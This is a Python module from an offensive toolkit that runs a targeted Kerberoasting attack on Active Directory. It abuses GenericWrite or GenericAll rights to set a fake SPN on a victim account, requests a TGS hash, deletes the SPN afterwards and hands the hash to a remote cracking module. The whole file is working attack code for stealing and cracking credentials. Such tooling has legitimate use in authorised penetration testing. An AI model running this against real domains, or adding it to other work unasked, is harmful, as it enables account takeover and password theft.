"""
Targeted Kerberoasting Module
Uses targetedKerberoast.py to abuse GenericWrite/GenericAll,
set a fake SPN, request TGS, and clean up.
Auto-cracks results via the hashcrack module.

Works on Exegol, Kali, BlackArch, and any system with the required tools.
"""

import os
import shutil
import subprocess
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class TargetedKerberoast(ModuleBase):
    """
    Targeted Kerberoasting attack.
    When you have GenericWrite or GenericAll over a user, this module
    uses targetedKerberoast.py to set a fake SPN, request TGS, then
    remove the SPN automatically.

    Falls back to manual ldap3 + GetUserSPNs.py if targetedKerberoast.py
    is unavailable.
    """

    def __init__(self):
        super().__init__()
        self.name = "targeted_kerberoast"
        self.description = "Targeted Kerberoast - abuse GenericWrite to set SPN, roast, and crack"
        self.author = "UwU Toolkit"
        self.version = "2.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "kerberos", "kerberoast", "kerbrute", "genericwrite",
                     "targeted", "spn", "credential", "attack", "acl"]
        self.references = [
            "https://attack.mitre.org/techniques/T1558/003/",
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast",
            "https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting",
            "https://github.com/ShutdownRepo/targetedKerberoast",
        ]

        # Core options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name (e.g. 404finance.local)", required=True)
        self.register_option("USER", "Username with GenericWrite on target", required=True)
        self.register_option("PASS", "Password for USER", required=True)

        # Target (optional - if not set, tool discovers all abusable users)
        self.register_option("TARGET_USER", "Specific user to kerberoast (optional, discovers all if empty)", default="")

        # Hash authentication (alternative to password)
        self.register_option("HASHES", "NT/LM hashes (LMhash:NThash) - alternative to PASS", default="")

        # Output
        self.register_option("OUTPUT", "Output file for TGS hash(es)", default="Kerberoastables.txt")

        # Cracking
        self.register_option("AUTO_CRACK", "Auto-crack with hashcrack module after roasting",
                             default="yes", choices=["yes", "no"])
        self.register_option("SSH_HOST", "SSH host for hashcrack (passed to hashcrack module)", default="omarchy")
        self.register_option("WORDLIST", "Wordlist for cracking (on remote host)", default="$HOME/tools/rockyou.txt")

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        target_user = self.get_option("TARGET_USER")
        hashes = self.get_option("HASHES")
        output = self.get_option("OUTPUT")
        auto_crack = self.get_option("AUTO_CRACK") == "yes"

        self.print_status(f"Target DC: {dc_ip}")
        self.print_status(f"Attacker: {domain}\\{user}")
        if target_user:
            self.print_status(f"Target:   {target_user}")
        else:
            self.print_status("Target:   (auto-discover all abusable users)")
        self.print_line()

        # Step 1: Run targeted kerberoasting
        output_path = os.path.abspath(output)
        success = self._run_targeted_kerberoast_py(dc_ip, domain, user, password, hashes, target_user, output_path)

        if not success:
            # Fallback to manual approach (only works with TARGET_USER)
            if not target_user:
                self.print_error("Manual fallback requires TARGET_USER to be set")
                return False
            self.print_status("Falling back to manual approach...")
            success = self._run_manual(dc_ip, domain, user, password, hashes, target_user, output_path)

        if not success:
            self.print_error("Targeted kerberoasting failed")
            return False

        # Verify output file has hashes
        try:
            with open(output_path, "r") as f:
                hash_data = f.read().strip()
        except IOError:
            self.print_error(f"Could not read output file: {output_path}")
            return False

        if not hash_data or "$krb5tgs$" not in hash_data:
            self.print_error("No TGS hashes captured")
            return False

        hash_count = hash_data.count("$krb5tgs$")
        self.print_good(f"Captured {hash_count} TGS hash(es) in {output_path}")
        self.print_line()

        # Step 2: Auto-crack with hashcrack module
        if auto_crack:
            self.print_status("Auto-cracking with hashcrack module...")
            self._auto_crack(output_path)
        else:
            self.print_status(f"Crack manually: use auxiliary/cracking/hashcrack; set HASHFILE {output_path}; set HASHTYPE 13100; run")

        return True

    # =========================================================================
    # Primary: targetedKerberoast.py
    # =========================================================================

    def _find_targeted_kerberoast(self):
        """
        Find targetedKerberoast.py and the correct Python to run it.
        Returns (python_path, script_path) or (None, None) if not found.
        """
        # Common locations for the script
        script_locations = [
            "/opt/tools/targetedKerberoast/targetedKerberoast.py",
            os.path.expanduser("~/.local/share/targetedKerberoast/targetedKerberoast.py"),
        ]

        # Also check if it's in PATH
        in_path = shutil.which("targetedKerberoast.py")
        if in_path:
            script_locations.insert(0, in_path)

        for script_path in script_locations:
            if not os.path.isfile(script_path):
                continue

            # Try matching venv first (has impacket bundled)
            script_dir = os.path.dirname(script_path)
            venv_python = os.path.join(script_dir, "venv", "bin", "python3")
            if os.path.isfile(venv_python):
                return venv_python, script_path

            # Try system python (impacket must be installed globally)
            return "python3", script_path

        return None, None

    def _run_targeted_kerberoast_py(self, dc_ip, domain, user, password, hashes, target_user, output_path) -> bool:
        """
        Run targetedKerberoast.py - handles SPN set, TGS request, and cleanup automatically.
        """
        python_path, script_path = self._find_targeted_kerberoast()

        if not script_path:
            self.print_warning("targetedKerberoast.py not found")
            return False

        # Build command
        cmd_parts = [python_path, script_path, "-v"]
        cmd_parts.extend(["-d", domain])
        cmd_parts.extend(["-u", user])
        cmd_parts.extend(["--dc-ip", dc_ip])
        cmd_parts.extend(["-o", output_path])

        if hashes:
            cmd_parts.extend(["-H", hashes])
        elif password:
            cmd_parts.extend(["-p", password])
        else:
            cmd_parts.append("--no-pass")

        if target_user:
            cmd_parts.extend(["--request-user", target_user])

        self.print_status(f"Running targetedKerberoast.py ...")

        try:
            result = subprocess.run(
                cmd_parts,
                capture_output=True,
                text=True,
                timeout=120
            )
            output = result.stdout + result.stderr
        except FileNotFoundError:
            self.print_warning(f"Could not execute: {python_path}")
            return False
        except subprocess.TimeoutExpired:
            self.print_error("Command timed out (120s)")
            return False

        # Print output
        for line in output.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            if "[+]" in line or "Writing hash" in line:
                self.print_good(line)
            elif "[*]" in line or "[VERBOSE]" in line:
                self.print_status(line)
            elif "[-]" in line or "error" in line.lower():
                self.print_error(line)
            elif "[!]" in line:
                self.print_warning(line)

        # Check if output file was created with hashes
        try:
            with open(output_path, "r") as f:
                content = f.read()
            if "$krb5tgs$" in content:
                return True
        except IOError:
            pass

        # Check stdout for hashes (some versions print to stdout)
        if "$krb5tgs$" in output:
            hash_lines = [line for line in output.split("\n") if "$krb5tgs$" in line]
            if hash_lines:
                with open(output_path, "w") as f:
                    f.write("\n".join(hash_lines) + "\n")
                return True

        if "SPN added successfully" in output and "Writing hash" in output:
            return True  # Tool reported success

        self.print_warning("targetedKerberoast.py did not produce hashes")
        return False

    # =========================================================================
    # Fallback: Manual ldap3 + GetUserSPNs.py approach
    # =========================================================================

    def _run_manual(self, dc_ip, domain, user, password, hashes, target_user, output_path) -> bool:
        """Manual approach: set SPN via ldap3, request TGS via GetUserSPNs.py, clean up"""
        fake_spn = f"HTTP/uwu-{target_user}"

        # Step 1: Set fake SPN
        self.print_status(f"Setting fake SPN '{fake_spn}' on {target_user}...")
        if not self._ldap3_modify_spn(dc_ip, domain, user, password, target_user, fake_spn, action="add"):
            self.print_error("Could not set SPN on target (ldap3 failed)")
            return False

        # Step 2: Request TGS
        self.print_status("Requesting TGS ticket...")
        hash_data = self._request_tgs(dc_ip, domain, user, password, hashes, target_user)

        # Step 3: Clean up
        self.print_status("Cleaning up - removing fake SPN...")
        self._ldap3_modify_spn(dc_ip, domain, user, password, target_user, fake_spn, action="delete")

        if not hash_data:
            self.print_error("Failed to retrieve TGS hash")
            return False

        with open(output_path, "w") as f:
            f.write(hash_data + "\n")

        return True

    def _ldap3_modify_spn(self, dc_ip, domain, user, password, target, spn, action="add") -> bool:
        """Use Python ldap3 to add/remove SPN"""
        try:
            import ldap3
        except ImportError:
            self.print_warning("ldap3 not available (pip install ldap3)")
            return False

        try:
            domain_dn = ",".join(f"DC={part}" for part in domain.split("."))
            bind_user = f"{domain}\\{user}"

            server = ldap3.Server(dc_ip, get_info=ldap3.ALL)
            conn = ldap3.Connection(server, user=bind_user, password=password, authentication=ldap3.NTLM)

            if not conn.bind():
                self.print_warning(f"ldap3 bind failed: {conn.result}")
                return False

            conn.search(domain_dn, f"(sAMAccountName={target})", attributes=["distinguishedName", "servicePrincipalName"])
            if not conn.entries:
                self.print_error(f"Target user '{target}' not found in LDAP")
                conn.unbind()
                return False

            target_dn = str(conn.entries[0].distinguishedName)
            current_spns = list(conn.entries[0].servicePrincipalName) if conn.entries[0].servicePrincipalName else []

            if action == "add":
                if spn in current_spns:
                    self.print_warning(f"SPN '{spn}' already exists on {target}")
                    conn.unbind()
                    return True
                conn.modify(target_dn, {"servicePrincipalName": [(ldap3.MODIFY_ADD, [spn])]})
            elif action == "delete":
                if spn not in current_spns:
                    conn.unbind()
                    return True
                conn.modify(target_dn, {"servicePrincipalName": [(ldap3.MODIFY_DELETE, [spn])]})

            if conn.result["result"] == 0:
                verb = "set on" if action == "add" else "removed from"
                self.print_good(f"SPN '{spn}' {verb} {target} (via ldap3)")
                conn.unbind()
                return True
            else:
                self.print_warning(f"ldap3 modify failed: {conn.result.get('description', conn.result)}")
                conn.unbind()
                return False

        except Exception as e:
            self.print_warning(f"ldap3 error: {e}")
            return False

    def _request_tgs(self, dc_ip, domain, user, password, hashes, target) -> str:
        """Request TGS ticket for the target user using GetUserSPNs.py"""
        tool = find_tool("GetUserSPNs.py")
        if not tool:
            self.print_error("GetUserSPNs.py not found in PATH")
            return ""

        cmd = [tool, f"{domain}/{user}"]
        if hashes:
            cmd.extend(["-hashes", hashes])
        elif password:
            cmd.append(f":{password}")  # user:password format
            cmd = [tool, f"{domain}/{user}:{password}"]
        cmd.extend(["-dc-ip", dc_ip, "-request-user", target, "-outputfile", "/tmp/uwu_tgs.txt"])

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            output = result.stdout + result.stderr
        except Exception as e:
            self.print_warning(f"GetUserSPNs.py error: {e}")
            return ""

        # Check output file
        try:
            with open("/tmp/uwu_tgs.txt", "r") as f:
                hash_content = f.read().strip()
            os.unlink("/tmp/uwu_tgs.txt")
            if "$krb5tgs$" in hash_content:
                self.print_good("TGS hash captured!")
                return hash_content
        except (IOError, OSError):
            pass

        # Check stdout
        for line in output.split("\n"):
            if "$krb5tgs$" in line:
                self.print_good("TGS hash captured!")
                return line.strip()

        return ""

    # =========================================================================
    # Auto-crack via hashcrack module
    # =========================================================================

    def _auto_crack(self, hash_file) -> bool:
        """Load and invoke the hashcrack module to crack the TGS hash(es)"""
        try:
            from core.module_loader import ModuleLoader
            import pathlib

            # Find modules directory relative to this file
            # __file__ = .../modules/auxiliary/ad/targeted_kerberoast.py
            # 4 parents up = toolkit root
            toolkit_root = pathlib.Path(__file__).resolve().parent.parent.parent.parent
            modules_path = toolkit_root / "modules"

            loader = ModuleLoader(str(modules_path))
            loader.discover_modules()
            hashcrack = loader.load_module("auxiliary/cracking/hashcrack")

            if not hashcrack:
                self.print_warning("Could not load hashcrack module")
                self._print_manual_crack(hash_file)
                return False

            # Configure hashcrack module
            hashcrack.set_option("HASHFILE", hash_file)
            hashcrack.set_option("HASHTYPE", "13100")
            hashcrack.set_option("SSH_HOST", self.get_option("SSH_HOST"))
            hashcrack.set_option("WORDLIST", self.get_option("WORDLIST"))

            # Pass through config if we have one
            if self._config:
                hashcrack.set_config(self._config)

            self.print_line()
            self.print_status("=" * 60)
            self.print_status("HASHCRACK MODULE")
            self.print_status("=" * 60)

            return hashcrack.run()

        except Exception as e:
            self.print_warning(f"Auto-crack failed: {e}")
            self._print_manual_crack(hash_file)
            return False

    def _print_manual_crack(self, hash_file):
        """Print manual cracking instructions"""
        self.print_line()
        self.print_status("Crack manually:")
        self.print_line(f"  uwu> use auxiliary/cracking/hashcrack")
        self.print_line(f"  uwu> set HASHFILE {hash_file}")
        self.print_line(f"  uwu> set HASHTYPE 13100")
        self.print_line(f"  uwu> run")

    def check(self) -> bool:
        """Check if required tools are available"""
        found = False

        # Check targetedKerberoast.py
        python_path, script_path = self._find_targeted_kerberoast()
        if script_path:
            self.print_good(f"targetedKerberoast.py found: {script_path}")
            found = True
        else:
            self.print_warning("targetedKerberoast.py not found")

        # Check ldap3 + GetUserSPNs.py (fallback)
        try:
            import ldap3  # noqa: F401
            self.print_good("ldap3 available (fallback SPN method)")
        except ImportError:
            self.print_warning("ldap3 not available")

        tool = find_tool("GetUserSPNs.py")
        if tool:
            self.print_good(f"GetUserSPNs.py found: {tool}")
            found = True
        else:
            self.print_warning("GetUserSPNs.py not found")

        if not found:
            self.print_error("No kerberoasting tools available")
            return False

        return True
